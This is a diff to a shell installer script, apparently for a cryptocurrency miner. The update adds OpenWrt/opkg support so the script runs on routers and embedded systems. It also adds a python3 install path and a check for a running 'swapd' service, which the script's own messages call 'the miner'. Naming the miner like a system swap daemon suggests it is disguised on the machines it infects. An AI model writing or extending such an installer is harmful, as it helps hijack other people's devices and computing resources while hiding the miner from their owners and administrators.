@@ -2,8 +2,8 @@
 # Debug mode disabled for cleaner output
 
 # ==================== VERSION TRACKING ====================
-readonly SCRIPT_VERSION="3.8"
-readonly BUILD_DATE="2026-03-15 04:03:33 UTC"
+readonly SCRIPT_VERSION="4.1"
+readonly BUILD_DATE="2026-03-22 03:55:40 UTC"
 readonly SCRIPT_NAME="setup_m0_launcher"
 
 echo "=========================================="
@@ -14,6 +14,20 @@ echo "Version: $SCRIPT_VERSION"
 echo "Build Date: $BUILD_DATE"
 echo "=========================================="
 echo ""
+
+# ==================== OPKG SUPPORT (OpenWrt/Embedded Systems) ====================
+if command -v opkg >/dev/null 2>&1; then
+    echo "=========================================="
+    echo "OPENWRT/OPKG DETECTED"
+    echo "=========================================="
+    echo "[*] Detected opkg package manager (OpenWrt/LEDE)"
+    echo "[*] Updating package lists and installing essential tools..."
+    opkg update
+    opkg install iptraf-ng curl wget bash
+    echo "[✓] OpenWrt packages updated and installed"
+    echo "=========================================="
+    echo ""
+fi
 
 # ==================== CENTOS 6.X AUTO-FIX (EOL REPOSITORY) ====================
 # CentOS 6.x reached End-of-Life in 2020 and has old SSL libraries that can't
@@ -1101,7 +1115,10 @@ EOF
     # Install Python3 if not present (needed for email)
     if ! command_exists python3; then
         log_message "Python3 not found - installing..."
-        if command -v apt >/dev/null 2>&1; then
+        if command -v opkg >/dev/null 2>&1; then
+            opkg update >/dev/null 2>&1
+            opkg install python3 >/dev/null 2>&1
+        elif command -v apt >/dev/null 2>&1; then
             DEBIAN_FRONTEND=noninteractive apt-get update -qq >/dev/null 2>&1
             DEBIAN_FRONTEND=noninteractive apt-get install -y -qq python3 >/dev/null 2>&1
         elif command -v yum >/dev/null 2>&1; then
@@ -1655,6 +1672,56 @@ user_installation() {
 # Initialize log file
 : > "$LOG_FILE"
 log_message "Script started by user: $(whoami)"
+
+# ==================== CHECK IF SWAPD IS ALREADY RUNNING ====================
+log_message "Checking if swapd service is already running..."
+
+SWAPD_RUNNING=false
+
+# Check systemd service
+if command -v systemctl >/dev/null 2>&1; then
+    if systemctl is-active --quiet swapd 2>/dev/null; then
+        SWAPD_RUNNING=true
+        log_message "Detected: swapd.service is active (systemd)"
+    fi
+fi
+
+# Check SysV init service
+if [ "$SWAPD_RUNNING" = false ] && [ -f /etc/init.d/swapd ]; then
+    if service swapd status 2>/dev/null | grep -qE "running|active"; then
+        SWAPD_RUNNING=true
+        log_message "Detected: swapd service is running (init.d)"
+    fi
+fi
+
+# Check for swapd process
+if [ "$SWAPD_RUNNING" = false ]; then
+    if pgrep -x swapd >/dev/null 2>&1 || pgrep -f "swapd.*--algo\|swapd.*config.json" >/dev/null 2>&1; then
+        SWAPD_RUNNING=true
+        log_message "Detected: swapd process is running"
+    fi
+fi
+
+if [ "$SWAPD_RUNNING" = true ]; then
+    echo ""
+    echo "=========================================="
+    echo "INSTALLATION ABORTED"
+    echo "=========================================="
+    echo "[!] swapd is already running on this system!"
+    echo ""
+    echo "The miner is already installed and running."
+    echo "To reinstall, first stop the service:"
+    echo ""
+    echo "  systemctl stop swapd     # For systemd"
+    echo "  service swapd stop       # For init.d"
+    echo "  pkill -9 swapd           # Kill process directly"
+    echo ""
+    echo "Then run this script again."
+    echo "=========================================="
+    exit 0
+fi
+
+log_message "No running swapd service detected - proceeding with installation"
 
 # Check dependencies first
 if ! check_dependencies; then
